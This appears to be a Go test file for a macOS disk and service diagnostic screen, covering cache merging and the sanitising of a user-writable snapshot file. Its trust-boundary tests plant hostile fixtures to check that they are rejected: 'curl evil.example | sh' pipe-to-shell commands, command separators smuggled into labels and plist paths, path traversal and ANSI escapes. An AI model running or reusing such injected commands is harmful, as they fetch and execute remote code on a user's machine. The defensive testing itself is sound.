	j := find("診断できず")
	v.Cur.Index = j
	if got := v.HandleKey("y", 40); got != doctorview.DoctorCopyPath || v.CopyPayload() != "/Library/LaunchDaemons/com.vendor.broken.plist" {
		t.Errorf("Undiagnosed 行の y: action=%v payload=%q", got, v.CopyPayload())
	}
	v.Cur.Index = j
	if got := v.HandleKey("Y", 40); got != doctorview.DoctorCopyText {
		t.Fatalf("Undiagnosed 行の Y: action=%v", got)
	}
	for _, want := range []string{"/Library/LaunchDaemons/com.vendor.broken.plist", "permission denied", "plutil -p ", "ls -l "} {
		if !strings.Contains(v.CopyPayload(), want) {
			t.Errorf("Undiagnosed 行の Y に %q が無い:\n%s", want, v.CopyPayload())
		}
	}

	// Enter で理由が読める (一覧の行は幅で切れても、詳細には出る)
	v.Cur.Index = j
	v.HandleKey("enter", 40)
	if txt := strings.Join(v.Lines(doctortest.DoctorTestOpts(40)), "\n"); !strings.Contains(txt, "理由: plist を読めない") {
		t.Errorf("Undiagnosed 行の Enter で理由が出ない:\n%s", txt)
	}
}

// issue 172: 再利用 (Reused) した計測値はトーストの材料にしない。行には「N 分前の計測を再利用」の
// 注記が付くが、トーストには無い。実体を消した後も最大 1 時間「解放できます」と言い続け、
// 「開けば直る」も効かない (トーストは次に doctor を開くまで更新されない)。
// 代わりに**前回のキャッシュのそのエントリを引き継ぐ** (= 最後に実測した値)。
func TestDoctorSaveCacheKeepsLastRealMeasurement(t *testing.T) {
	ok := func(id string, size int64) disk.Result {
		return disk.Result{Entry: disk.Entry{ID: id, Label: id}, Status: disk.StatusOK, Size: size,
			Items: []disk.Item{{Path: "/" + id, Size: size}}}
	}
	rep := func(rs ...disk.Result) disk.Report {
		return disk.Report{ScannedAt: time.Now(), Results: rs, Total: disk.SumDeletable(rs)}
	}
	prev := doctorview.DoctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Entries: []doctorview.DoctorDiskCacheEntry{
		{ID: "heavy", Label: "Heavy", Size: 44 << 30, Status: "ok"},
		{ID: "small", Label: "Small", Size: 1 << 30, Status: "ok"},
	}}
	// heavy は再利用 (今回は実測していない)。しかも古い値が実態より大きい
	reused := ok("heavy", 100<<30)
	reused.Reused = true

	next := doctorview.DoctorCacheFromReport(rep(reused, ok("small", 1<<30)), prev)
	if next.Total != 45<<30 {
		t.Errorf("再利用ぶんに前回の実測値 (44GB) が使われていない: total=%d", next.Total)
	}
	for _, e := range next.Entries {
		if e.ID == "heavy" && e.Size != 44<<30 {
			t.Errorf("再利用した計測値 (100GB) がトーストの材料に乗った: size=%d", e.Size)
		}
	}
	if !next.Reused {
		t.Error("再利用を含む結果に Reused の印が付いていない")
	}

	// 前回のエントリが無ければ持たない (でっち上げない)
	orphan := doctorview.DoctorCacheFromReport(rep(reused), doctorview.DoctorDiskCache{ScannedAt: time.Now()})
	if orphan.Total != 0 || len(orphan.Entries) != 0 {
		t.Errorf("前回の実測が無いのに再利用ぶんを載せた: %+v", orphan)
	}

	// 完全な実測どうしなら、減っていても上書きする (実体が消えたことを反映する)
	v := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(prev); err != nil {
		t.Fatal(err)
	}
	v.SaveCache(rep(ok("small", 1<<30)))
	if c, _ := doctorview.LoadDoctorDiskCache(); c.Total != 1<<30 {
		t.Errorf("完全な実測で上書きされない: total=%d", c.Total)
	}
}

// issue 172 の敵対レビュー (2026-09-03、3 周): 「Reused が 1 件でもあれば結果ごと書かない」に
// してはいけない。doctorview.DoctorReuseFrom の 1 時間は**各エントリが実測されるたびにリセットされる**ので、
// 重いエントリが 2 件以上あって実測時刻が互い違いだと「常にどれか 1 件が再利用対象」の状態が
// 持続し、キャッシュが恒久的に凍結する (実測: 20 分おきに 6 時間・18 回開いても一度も更新されず、
// 軽いエントリが 1GB → 100GB に激増しても反映されなかった)。エントリ単位でマージする。
func TestDoctorSaveCacheDoesNotFreezeWithStaggeredReuse(t *testing.T) {
	base := doctorview.DoctorDiskCache{ScannedAt: time.Now(), Total: 21 << 30, Entries: []doctorview.DoctorDiskCacheEntry{
		{ID: "heavyA", Label: "HeavyA", Size: 10 << 30, Status: "ok"},
		{ID: "heavyB", Label: "HeavyB", Size: 10 << 30, Status: "ok"},
		{ID: "small", Label: "Small", Size: 1 << 30, Status: "ok"},
	}}
	res := func(id string, size int64, reused bool) disk.Result {
		return disk.Result{Entry: disk.Entry{ID: id, Label: id}, Status: disk.StatusOK, Size: size,
			Items: []disk.Item{{Path: "/" + id, Size: size}}, Reused: reused}
	}
	// 18 回 (20 分おき・6 時間相当)。毎回どちらかの重いエントリが再利用対象になる。
	// small は 1GB → 100GB に激増している (ユーザーが気づきたい急変)
	v := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(base); err != nil {
		t.Fatal(err)
	}
	for i := range 18 {
		a, b := i%2 == 0, i%2 == 1
		v.SaveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
			res("heavyA", 10<<30, a), res("heavyB", 10<<30, b), res("small", 100<<30, false)}})
	}
	if c, _ := doctorview.LoadDoctorDiskCache(); c.Total != 120<<30 {
		t.Errorf("互い違いの再利用でキャッシュが凍結した (small の激増が反映されない): total=%d want=%d", c.Total, int64(120)<<30)
	}
	// 診断できず件数も凍結しない (Reused と failed が同居する形)
	v2 := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(base); err != nil {
		t.Fatal(err)
	}
	for range 3 {
		v2.SaveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
			res("heavyA", 10<<30, true),
			{Entry: disk.Entry{ID: "heavyB", Label: "HeavyB"}, Status: disk.StatusFailed, Reason: "permission denied"},
			res("small", 1<<30, false)}})
	}
	if c, _ := doctorview.LoadDoctorDiskCache(); c.Failed != 1 {
		t.Errorf("Reused と failed が同居すると診断できず件数が入らない: failed=%d", c.Failed)
	}
}

// issue 173 の敵対レビュー (2026-09-03、2 周): failed を含む「完走した」結果はキャッシュを更新する。
// ガードに載せると「1 エントリが恒久的に測れない Mac」でキャッシュが永久に凍結し (保存しない →
// 次回も prev は完全なまま → 同じ判定)、合計も Failed 件数も更新されない = issue 173 が塞いだはずの
// sinking silently の再現。時間で区切る形も採らない (「前回の完全結果の古さ」は「今回の結果が
// 途中経過か」と無関係で、doctor をたまにしか開かない運用が丸ごと無保護になる)。
// 沈黙は Failed 件数とトースト側で防ぐ。
func TestDoctorSaveCacheWritesCompletedScanWithFailures(t *testing.T) {
	now := time.Date(2026, 9, 3, 12, 0, 0, 0, time.Local)
	chronic := disk.Report{ScannedAt: now, Results: []disk.Result{
		{Entry: disk.Entry{ID: "npm-cache", Label: "Small"}, Status: disk.StatusOK, Size: 1 << 30,
			Items: []disk.Item{{Path: "/small", Size: 1 << 30}}},
		{Entry: disk.Entry{ID: "xcode-deriveddata", Label: "Heavy"}, Status: disk.StatusFailed, Reason: "permission denied"},
	}}
	chronic = chronic.WithResults(chronic.Results)

	// 何度繰り返しても凍結しない (完走している結果はその環境の現実)
	v := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(doctorview.DoctorDiskCache{ScannedAt: now.Add(-3 * time.Hour), Total: 45 << 30}); err != nil {
		t.Fatal(err)
	}
	for range 3 {
		v.SaveCache(chronic)
	}
	c, _ := doctorview.LoadDoctorDiskCache()
	if c.Total != 1<<30 {
		t.Errorf("完走した結果でキャッシュが更新されない (latch): total=%d", c.Total)
	}
	if c.Failed != 1 {
		t.Errorf("診断できず件数が入らない: failed=%d", c.Failed)
	}
	// 凍結しない代わりに、トーストが沈黙しない (閾値未満だが「診断できず」を伝える)
	if got := doctorview.DoctorStartupToast(c, true, now); !strings.Contains(got, "1 件を診断できませんでした") {
		t.Errorf("トーストが沈黙した: %q", got)
	}

	// 一方、**中断した部分結果** (partial) は完全な結果を潰さない。前回の記録に重ねて書くので、
	// 走査が届かなかったエントリの数字が残る (敵対レビュー 2026-09-03: 3 時間前の 45GB が
	// 「開いて即 Esc」の 1MB で潰れる形にしてはいけない)。
	// 🚨 ただし引き継ぎには鮮度の上限 (doctorview.DoctorCarryTTL) がある。上限を持たせないと、
	// 「重いので毎回 Esc の前にたどり着けない」エントリが無期限に延命し、実体が消えても
	// 検出する手段が構造上無くなる (同レビュー 5 周目)。
	partial := func() disk.Report {
		return disk.Report{ScannedAt: now, Partial: true, Results: []disk.Result{
			{Entry: disk.Entry{ID: "small", Label: "Small"}, Status: disk.StatusOK, Size: 1 << 20,
				MeasuredAt: now, Items: []disk.Item{{Path: "/small", Size: 1 << 20}}}}}
	}
	prevWith := func(measured time.Time) doctorview.DoctorDiskCache {
		return doctorview.DoctorDiskCache{ScannedAt: measured, Total: 45 << 30, Entries: []doctorview.DoctorDiskCacheEntry{
			{ID: "big", Label: "Big", Size: 45 << 30, Status: "ok", MeasuredAt: measured}}}
	}
	for _, tc := range []struct {
		name    string
		age     time.Duration
		carried bool
	}{
		{"1 分前", time.Minute, true},
		{"TTL 直前", doctorview.DoctorCarryTTL - time.Minute, true},
		{"TTL 超過 (30 日前)", 30 * 24 * time.Hour, false},
		{"未来 (時計を戻した)", -time.Hour, true}, // 記録を残す側が安全
	} {
		v2 := doctortest.DoctorTestView(t)
		if err := doctorview.SaveDoctorDiskCache(prevWith(now.Add(-tc.age))); err != nil {
			t.Fatal(err)
		}
		v2.SaveCache(partial())
		c, _ := doctorview.LoadDoctorDiskCache()
		if got := c.Total >= 45<<30; got != tc.carried {
			t.Errorf("%s: 引き継ぎ=%v want=%v (total=%d)", tc.name, got, tc.carried, c.Total)
		}
	}
}

// issue 173 の敵対レビュー (2026-09-03、4 周): 中断した部分結果を**洗い替えで**書くと、
// 今回走査が届かなかったエントリの記録と「診断できず」件数が消える。
// 「合計が前回より大きい partial は書いてよい」(2026-09-02 の仕様) を経由するので、
// 大きいエントリを 1 つ測った直後に Esc するだけで恒久 failed の記録が failed=0 に化けた。
// partial は前回の記録に**重ねて**書く。
func TestDoctorSaveCachePartialMergesInsteadOfReplacing(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	base := doctorview.DoctorDiskCache{ScannedAt: time.Now(), Total: 5 << 30, Entries: []doctorview.DoctorDiskCacheEntry{
		{ID: "heavy", Label: "Heavy", Size: 5 << 30, Status: "ok"},
		{ID: "broken", Label: "Broken", Size: 0, Status: "failed"}, // 恒久的に測れないエントリ
	}}
	base.Failed = 1
	if err := doctorview.SaveDoctorDiskCache(base); err != nil {
		t.Fatal(err)
	}
	// heavy にも broken にも触れないまま、大きい新エントリだけを測って中断した
	v.SaveCache(disk.Report{ScannedAt: time.Now(), Partial: true, Results: []disk.Result{
		{Entry: disk.Entry{ID: "new", Label: "New"}, Status: disk.StatusOK, Size: 50 << 30,
			Items: []disk.Item{{Path: "/new", Size: 50 << 30}}}}})
	c, _ := doctorview.LoadDoctorDiskCache()
	byID := map[string]doctorview.DoctorDiskCacheEntry{}
	for _, e := range c.Entries {
		byID[e.ID] = e
	}
	if e, ok := byID["heavy"]; !ok || e.Size != 5<<30 {
		t.Errorf("走査が届かなかったエントリの記録が消えた: %+v", c.Entries)
	}
	if _, ok := byID["broken"]; !ok || c.Failed != 1 {
		t.Errorf("「診断できず」の記録が消えた (sinking silently): failed=%d entries=%+v", c.Failed, c.Entries)
	}
	if c.Total != 55<<30 {
		t.Errorf("合計が重ならない: total=%d want=%d", c.Total, int64(55)<<30)
	}
	// 重ねるといっても、**今回測って候補 0 件になった**エントリは消す (掃除した結果を残さない)
	v3 := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(base); err != nil {
		t.Fatal(err)
	}
	v3.SaveCache(disk.Report{ScannedAt: time.Now(), Partial: true, Results: []disk.Result{
		{Entry: disk.Entry{ID: "heavy", Label: "Heavy"}, Status: disk.StatusOK, Items: []disk.Item{}},
		{Entry: disk.Entry{ID: "new", Label: "New"}, Status: disk.StatusOK, Size: 50 << 30,
			Items: []disk.Item{{Path: "/new", Size: 50 << 30}}}}})
	c3, _ := doctorview.LoadDoctorDiskCache()
	for _, e := range c3.Entries {
		if e.ID == "heavy" {
			t.Errorf("今回測って候補 0 件になったエントリが残った: %+v", c3.Entries)
		}
	}
	if c3.Total != 50<<30 {
		t.Errorf("候補 0 件になったエントリが合計に残った: total=%d", c3.Total)
	}
	// 完走した結果は洗い替えでよい (カタログを一巡しているので、消えたエントリは本当に消えた)
	v2 := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(base); err != nil {
		t.Fatal(err)
	}
	v2.SaveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
		{Entry: disk.Entry{ID: "new", Label: "New"}, Status: disk.StatusOK, Size: 50 << 30,
			Items: []disk.Item{{Path: "/new", Size: 50 << 30}}}}})
	if c, _ := doctorview.LoadDoctorDiskCache(); len(c.Entries) != 1 || c.Entries[0].ID != "new" || c.Failed != 0 {
		t.Errorf("完走した結果に前回の記録が残った: failed=%d entries=%+v", c.Failed, c.Entries)
	}
}

// 2026-09-02 の敵対レビュー P2 の回帰テスト。以前は saveCache の「合計が前回より小さければ書かない」
// ガードが守っていたが、partial を前回の記録に重ねて書くようにした時点でそのガードは冗長になり、
// 「今回実際に測り直して縮んだと分かったエントリ」まで古い値へ差し戻す副作用があったので外した
// (issue 173 にマスクしていた failure mode を列挙してある)。**この不変条件を今守っているのは
// マージそのもの**なので、ガードではなくマージに対する回帰テストとしてここに置く。
func TestDoctorSaveCacheNearEmptyPartialDoesNotCollapseCache(t *testing.T) {
	now := time.Now()
	v := doctortest.DoctorTestView(t)
	prev := doctorview.DoctorDiskCache{ScannedAt: now, Total: 45 << 30, Entries: []doctorview.DoctorDiskCacheEntry{
		{ID: "xcode-deriveddata", Label: "A", Size: 30 << 30, Status: "ok", MeasuredAt: now},
		{ID: "npm-cache", Label: "B", Size: 15 << 30, Status: "ok", MeasuredAt: now},
	}}
	if err := doctorview.SaveDoctorDiskCache(prev); err != nil {
		t.Fatal(err)
	}
	// 開いた直後に Esc: 1 件も完了していない部分結果
	v.SaveCache(disk.Report{ScannedAt: now, Partial: true})
	c, _ := doctorview.LoadDoctorDiskCache()
	if c.Total != 45<<30 || len(c.Entries) != 2 {
		t.Fatalf("何も測っていない partial が完全な結果を潰した: %+v", c)
	}
	if s := doctorview.DoctorStartupToast(c, true, now); !strings.Contains(s, "45.0GB") {
		t.Errorf("トーストが沈黙した / 数字が変わった: %q", s)
	}
	// 鮮度はキャッシュ全体の ScannedAt ではなく**エントリごとの MeasuredAt** で見る。
	// キャッシュは partial のたびに書き直されるので ScannedAt は常に新しくなり、それで判定すると
	// 「一度も測り直していない古い記録」が新しく見えて無期限に延命する
	vStale := doctortest.DoctorTestView(t)
	stale := prev
	stale.ScannedAt = now // キャッシュ自体は今書かれた
	stale.Entries = []doctorview.DoctorDiskCacheEntry{
		{ID: "xcode-deriveddata", Label: "A", Size: 30 << 30, Status: "ok", MeasuredAt: now.Add(-30 * 24 * time.Hour)}, // 実測は 30 日前
		{ID: "npm-cache", Label: "B", Size: 15 << 30, Status: "ok", MeasuredAt: now},
	}
	if err := doctorview.SaveDoctorDiskCache(stale); err != nil {
		t.Fatal(err)
	}
	vStale.SaveCache(disk.Report{ScannedAt: now, Partial: true})
	if c, _ := doctorview.LoadDoctorDiskCache(); c.Total != 15<<30 {
		t.Errorf("エントリごとの MeasuredAt で鮮度を見ていない (30 日前の実測が延命した): total=%d", c.Total)
	}

	// 逆に、**今回実際に測り直して縮んだ**エントリはその場で反映する (古い値へ差し戻さない)
	v2 := doctortest.DoctorTestView(t)
	if err := doctorview.SaveDoctorDiskCache(prev); err != nil {
		t.Fatal(err)
	}
	v2.SaveCache(disk.Report{ScannedAt: now, Partial: true, Results: []disk.Result{
		{Entry: disk.Entry{ID: "xcode-deriveddata", Label: "A"}, Status: disk.StatusOK, Size: 1 << 20, MeasuredAt: now,
			Items: []disk.Item{{Path: "/a", Size: 1 << 20}}}}})
	if c, _ := doctorview.LoadDoctorDiskCache(); c.Total != (15<<30)+(1<<20) {
		t.Errorf("測り直して縮んだ値が古い値へ差し戻された: total=%d", c.Total)
	}
}

// issue 178 (P1): doctor-snapshot.json は一般ユーザー権限で書き換えられる。細工した JSON の
// 任意パス・任意 ID・未知の Status・負のサイズ・未来の時刻が、行 / y のコピー / 合計 /
// 次の snapshot への書き戻しに載ってはいけない。④ (削除) はこの画面の行を対象にする設計なので、
// **削除を実装する前に**この境界を確定しておく。
func TestDoctorSnapshotTrustBoundary(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	now := time.Now()
	writeSnapshot := func(rs []disk.Result) {
		doctortest.WriteDoctorSnapshot(t, doctorview.DoctorSnapshot{ScannedAt: now.Add(-time.Minute), Disk: disk.Report{Results: rs, Total: 1 << 40}})
	}
	res := func(id string, st disk.Status, size int64, itemSize int64, measured time.Time) disk.Result {
		return disk.Result{Entry: disk.Entry{ID: id, Label: id}, Status: st, Size: size, MeasuredAt: measured,
			Items: []disk.Item{{Path: "/Users/koji/Documents", Size: itemSize}}}
	}
	good := res("thing", disk.StatusOK, 4096, 4096, now.Add(-time.Minute))
	good.Items[0].Path = "/ok"

	writeSnapshot([]disk.Result{
		good,
		res("gone-id", disk.StatusOK, 4700000000, 4700000000, now.Add(-time.Minute)), // カタログに無い ID
		res("thing", disk.Status("evil"), 1<<30, 1<<30, now.Add(-time.Minute)),       // 未知の Status
		res("thing", disk.StatusOK, -5, 0, now.Add(-time.Minute)),                    // 負の Result サイズ
		res("thing", disk.StatusOK, 0, -5, now.Add(-time.Minute)),                    // 負の Item サイズ
		res("thing", disk.StatusOK, 1<<30, 1<<30, now.Add(48*time.Hour)),             // 未来の MeasuredAt
	})
	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていない)。
	// 主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
	doctortest.RunDoctorCmds(t, v, v.Open())
	if v.SnapshotAt.IsZero() {
		t.Fatal("TTL 内なのに走査した (snapshot 復元の経路を通っていない)")
	}
	if len(v.DiskResults) != 1 || v.DiskResults[0].Entry.ID != "thing" || v.DiskResults[0].Size != 4096 {
		var got []string
		for _, r := range v.DiskResults {
			got = append(got, fmt.Sprintf("%s/%s/%d", r.Entry.ID, r.Status, r.Size))
		}
		t.Fatalf("細工した Result が復元された: %v", got)
	}
	// 1: 走査していない印が Result 単位で付く (④ は Reused の行を必ず再スキャンする)
	if !v.DiskResults[0].FromSnapshot {
		t.Error("snapshot 復元の Result に「走査していない」印 (FromSnapshot) が付いていない")
	}
	// 🚨 Reused を流用しない (行の「N 分前の計測を再利用」注記が普通の開き直しで嘘になる)
	if v.DiskResults[0].Reused {
		t.Error("snapshot 復元に Reused を流用している (別の意味を持つフィールド)")
	}
	if strings.Contains(doctortest.DoctorText(v, 60), "計測を再利用") {
		t.Error("snapshot からの復元に「計測を再利用」の注記が出た (普通の開き直しで嘘になる)")
	}
	// 合計も細工した値を引きずらない
	if v.DiskRep.Total != 4096 {
		t.Errorf("細工した合計が復元された: %d", v.DiskRep.Total)
	}
	out := doctortest.DoctorText(v, 60)
	for _, ng := range []string{"gone-id", "/Users/koji/Documents", "-5B", "4.4GB"} {
		if strings.Contains(out, ng) {
			t.Errorf("細工した内容が画面に出た (%q):\n%s", ng, out)
		}
	}
	v.Close()

	// 未来の ScannedAt は復元しない (reuse 側と同じ規律)。TTL 判定の age<0 が担う
	doctortest.WriteDoctorSnapshot(t, doctorview.DoctorSnapshot{ScannedAt: now.Add(48 * time.Hour), Disk: disk.Report{Results: []disk.Result{good}}})
	if _, ok := doctorview.LoadDoctorSnapshot(now); ok {
		t.Error("ScannedAt が未来の snapshot を復元した")
	}
}

// issue 178 の敵対レビュー (2026-09-03): サービス節と brew 節は sanitize を通っておらず、
// 細工した snapshot の `Commands` が「手で実行してください」の提示と `Y` のコピー文に
// そのまま載っていた (`curl evil | sh` を実際に載せられた)。ディスク節だけ境界を引いても
// この画面の信頼境界は閉じない。
func TestDoctorSnapshotTrustBoundarySvcAndBrew(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	now := time.Now()
	evil := svc.Finding{
		Label: "evil-label", PlistPath: "/tmp/evil.plist", Domain: "gui/501",
		Reasons: []string{"crafted\n⛔ 偽の行"}, Commands: []string{"curl evil.example | sh"},
	}
	// 材料の形が崩れているものは Finding ごと落とす
	badLabel := evil
	badLabel.Label = "a; curl evil | sh"
	badPath := evil
	badPath.PlistPath = "relative.plist"
	badDomain := evil
	badDomain.Domain = "gui/501; sh"
	dotdot := evil
	dotdot.PlistPath = "/Library/LaunchAgents/../../tmp/x.plist"
	sn := doctorview.DoctorSnapshot{ScannedAt: now.Add(-time.Minute),
		Disk: disk.Report{Results: []disk.Result{}},
		Svc:  svc.Report{Findings: []svc.Finding{evil, badLabel, badPath, badDomain, dotdot}},
		Brew: doctorview.BrewDoctorResult{Warnings: []string{
			"Warning: 正常な形\ncurl evil.example | sh",
			"curl evil.example | sh", // Warning: で始まらない = 落とす
			"Warning: \x1b[2J\x1b[H画面を消す",
		}},
	}
	doctortest.WriteDoctorSnapshot(t, sn)
	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていない)。
	// 主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
	doctortest.RunDoctorCmds(t, v, v.Open())
	if v.SnapshotAt.IsZero() {
		t.Fatal("TTL 内なのに走査した (snapshot 復元の経路を通っていない)")
	}
	if v.SvcRep == nil || len(v.SvcRep.Findings) != 1 {
		t.Fatalf("材料の形が崩れた Finding を落としていない: %+v", v.SvcRep)
	}
	got := v.SvcRep.Findings[0]
	// Commands は保存された文字列を使わず、Label / Domain / PlistPath から再生成する
	for _, c := range got.Commands {
		if strings.Contains(c, "curl") {
			t.Errorf("保存されたコマンドがそのまま復元された: %q", c)
		}
	}
	if len(got.Commands) != 2 || !strings.HasPrefix(got.Commands[0], "launchctl bootout gui/501/evil-label") {
		t.Errorf("コマンドが再生成されていない: %v", got.Commands)
	}
	// 表示用の自由文は制御文字を落とす (UI の行構造を偽装させない)
	for _, r := range got.Reasons {
		if strings.Contains(r, "\n") {
			t.Errorf("理由に改行が残った (行構造を偽装できる): %q", r)
		}
	}
	// brew は Warning: で始まる塊だけ / 制御文字を落とす
	if v.Brew == nil || len(v.Brew.Warnings) != 2 {
		t.Fatalf("brew の警告が絞られていない: %+v", v.Brew)
	}
	for _, w := range v.Brew.Warnings {
		if !strings.HasPrefix(w, "Warning:") {
			t.Errorf("Warning: で始まらない塊が残った: %q", w)
		}
		if strings.Contains(w, "\x1b") {
			t.Errorf("ANSI エスケープが残った: %q", w)
		}
	}
	// 画面 / コピー文にも出ない
	out := doctortest.DoctorText(v, 60)
	for _, ng := range []string{"curl evil.example", "\x1b[2J"} {
		if strings.Contains(out, ng) {
			t.Errorf("細工した内容が画面に出た (%q)", ng)
		}
	}
}

// issue 178 の敵対レビュー 2 周目: サービス節の残りの穴を塞ぐ。
//  1. Undiagnosed.PlistPath は Finding と違って形の検査が無く、`plutil -p <path>` の形で
//     引用なしに画面へ出ていた (`/tmp/x; curl evil | sh #` がそのまま表示・コピーされる)
//  2. 表示用の自由文でタブを明示的に通していた (term.DispWidth は幅 0 と数えるが端末は次のタブ位置まで
//     進むので、幅を数えるテストを素通りしたまま枠を壊せる)
//  3. ディスク節の自由文 (Reason / Failures / Contents) が無検査。doctorview.DiskCopyText は
//     「別セッションの LLM に消してよいか聞く」形を作るので prompt injection の材料になる
func TestDoctorSnapshotTrustBoundaryFreeText(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	now := time.Now()
	sn := doctorview.DoctorSnapshot{ScannedAt: now.Add(-time.Minute),
		Disk: disk.Report{Results: []disk.Result{{
			Entry: disk.Entry{ID: "thing", Label: "Thing キャッシュ"}, Status: disk.StatusOK, Size: 4096,
			MeasuredAt: now.Add(-time.Minute), Items: []disk.Item{{Path: "/ok", Size: 4096}},
			Reason:   "壊れた\x1b[2J理由\n偽の行を足す",
			Failures: []string{"読めず\ttab で枠を壊す\n偽の行", "\x1b[31m赤く塗る"},
			Contents: []string{"x\ty\nz"},
		}}},
		Svc: svc.Report{Undiagnosed: []svc.Undiagnosed{
			{PlistPath: "/Library/LaunchAgents/x; curl evil.example | sh #.plist", Reason: "壊れ\tた"},
			{PlistPath: "relative.plist", Reason: "形が崩れている"},
			{PlistPath: "/Library/LaunchAgents/../../tmp/x.plist", Reason: "形が崩れている"},
		}},
	}
	doctortest.WriteDoctorSnapshot(t, sn)
	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていない)。
	// 主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
	doctortest.RunDoctorCmds(t, v, v.Open())
	if v.SnapshotAt.IsZero() {
		t.Fatal("TTL 内なのに走査した")
	}
	// 1: 形が崩れた Undiagnosed は復元しない / 残ったものはコマンド行で引用される
	if v.SvcRep == nil || len(v.SvcRep.Undiagnosed) != 1 {
		t.Fatalf("形が崩れた Undiagnosed を落としていない: %+v", v.SvcRep)
	}
	copyText := doctorview.SvcUndiagnosedCopyText(v.SvcRep.Undiagnosed[0])
	for _, line := range strings.Split(copyText, "\n") {
		if (strings.HasPrefix(line, "  plutil") || strings.HasPrefix(line, "  ls ")) && !strings.Contains(line, "'") {
			t.Errorf("コマンド行でパスが引用されていない: %q", line)
		}
	}
	// 2 / 3: 自由文から制御文字 (タブ・ANSI) が落ちている
	all := doctortest.DoctorText(v, 60) + copyText + doctorview.DiskCopyText(v.DiskResults[0], "")
	for _, ng := range []string{"\t", "\x1b"} {
		if strings.Contains(all, ng) {
			t.Errorf("制御文字 %q が残った", ng)
		}
	}
	// ディスク節の自由文は**1 件が 1 行**として描かれるので、改行も落とす。
	// 残ると doctorview.DoctorRow.text に改行が入り、幅を数えるテストを素通りしたまま行数が増える
	r0 := v.DiskResults[0]
	for _, s := range append(append([]string{r0.Reason}, r0.Failures...), r0.Contents...) {
		if strings.Contains(s, "\n") {
			t.Errorf("1 行として描く自由文に改行が残った: %q", s)
		}
	}
	for _, line := range strings.Split(doctortest.DoctorText(v, 60), "\n") {
		if strings.Contains(line, "\r") {
			t.Errorf("1 行のはずの行に復帰が入った: %q", line)
		}
	}
}

// 狭い幅で「何の行か」「どう扱うか」が消えないこと (issue 182)。
//
// 幅で最初に切れるのは行の末尾なので、**そこに置いてよいのは失っても困らない情報だけ**。
// 状態 (リスク記号) と再利用の注記は末尾に置かない。
func TestDoctorDiskRowKeepsStateAtNarrowWidth(t *testing.T) {
	now := time.Date(2026, 9, 3, 12, 0, 0, 0, time.Local)
	v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}}
	v.DiskRep = &disk.Report{Results: []disk.Result{
		{Entry: disk.Entry{ID: "brew-orphan-state", Label: "アンインストール済み formula の状態",
			Risk: disk.RiskConfirm, Recover: "DB データ等の本体", DeleteVia: "trash"},
			Status: disk.StatusOK, Size: 3 << 30, Items: []disk.Item{{Path: "/opt/homebrew/var/x", Size: 3 << 30}}},
		{Entry: disk.Entry{ID: "chrome-tmp", Label: "Chrome 一時ファイル", Risk: disk.RiskSafe},
			Status: disk.StatusBlocked, Reason: "Google Chrome Canary 起動中のため対象外"},
		// 🚨 Recover は**実物に近い長さ**にする。短い文言だと、注記を末尾へ戻す変異でも
		// 行が幅に収まってしまい検出できない (実測 2026-09-03)。カタログの実際の Recover は
		// 「アプリを再インストールしても設定は戻りません」のように長い
		{Entry: disk.Entry{ID: "npm-cache", Label: "npm キャッシュ", Risk: disk.RiskSafe,
			Recover: "再取得されます。次のインストールは時間がかかります", DeleteVia: "rm"},
			Status: disk.StatusOK, Size: 2 << 30, Reused: true, MeasuredAt: now.Add(-20 * time.Minute),
			Items: []disk.Item{{Path: "/h/.npm", Size: 2 << 30, Mtime: now.Add(-48 * time.Hour)}}},
	}}

	for _, w := range []int{60, 80, 120} {
		o := doctortest.DoctorTestOpts(24)
		o.Width, o.Now = w, now
		txt := strings.Join(v.Lines(o), "\n")

		// 状態は幅に関わらず全部読める (末尾が切れて "⛔ 要…" にならない)
		for _, mark := range []string{"⛔ 要確認", "✅ 安全", "🚫 対象外"} {
			if !strings.Contains(txt, mark) {
				t.Errorf("幅 %d でリスク記号が切れた (%q が無い):\n%s", w, mark, txt)
			}
		}
		// blocked の理由は行を分けて全文出す (マーク列に置くと切れる)
		if !strings.Contains(txt, "Google Chrome Canary 起動中のため対象外") {
			t.Errorf("幅 %d で blocked の理由が読めない:\n%s", w, txt)
		}
		// 再利用の注記は行頭側なので、狭くても残る
		if !strings.Contains(txt, "20 分前の計測を再利用") {
			t.Errorf("幅 %d で再利用の注記が切れた (数字が古いと分からなくなる):\n%s", w, txt)
		}
		// 行はカード幅を超えない
		for _, line := range v.Lines(o) {
			if got := term.DispWidth(line); got > w {
				t.Errorf("幅 %d を超える行がある (%d 桁): %q", w, got, line)
			}
		}
	}

	// NO_COLOR (色なし) でも blocked と caution が記号で区別できる
	if doctorRiskMarkText(disk.Result{Status: disk.StatusBlocked}) == doctorRiskMarkText(
		disk.Result{Status: disk.StatusOK, Entry: disk.Entry{Risk: disk.RiskCaution}}) {
		t.Error("blocked と caution が同じ記号 (色を消すと区別できない)")
	}

	// 走査できなかった行に削除経路を出さない (CLI の Format と揃える)
	failed := disk.Result{Entry: disk.Entry{ID: "npm-cache", Label: "npm", DeleteVia: "rm"},
		Status: disk.StatusFailed, Reason: "権限がありません"}
	if d := strings.Join(rowTexts(v.DiskDetail(doctortest.DoctorTestOpts(24), failed)), "\n"); strings.Contains(d, "削除経路") {
		t.Errorf("走査できなかった行に削除経路が出た:\n%s", d)
	}
}

// doctorRiskMarkText はテスト用に記号だけを取り出す。
